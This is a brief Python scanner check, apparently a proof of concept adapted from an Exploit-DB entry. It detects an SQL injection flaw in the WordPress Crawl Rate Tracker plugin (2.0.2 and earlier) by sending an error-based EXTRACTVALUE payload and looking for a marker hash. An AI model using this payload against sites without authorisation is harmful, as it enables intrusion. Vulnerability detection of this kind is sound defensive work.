#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  WordPress Crawl Rate Tracker plugin <= 2.0.2 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17755/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg): 
    payload = ("/wp-content/plugins/crawlrate-tracker/sbtracking-chart-data.php?chart_data=1&page_url=-1%27%20AND%20EXTRACTVALUE(1,CONCAT(CHAR(58),MD5(3.14),CHAR(58)))--%20")
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])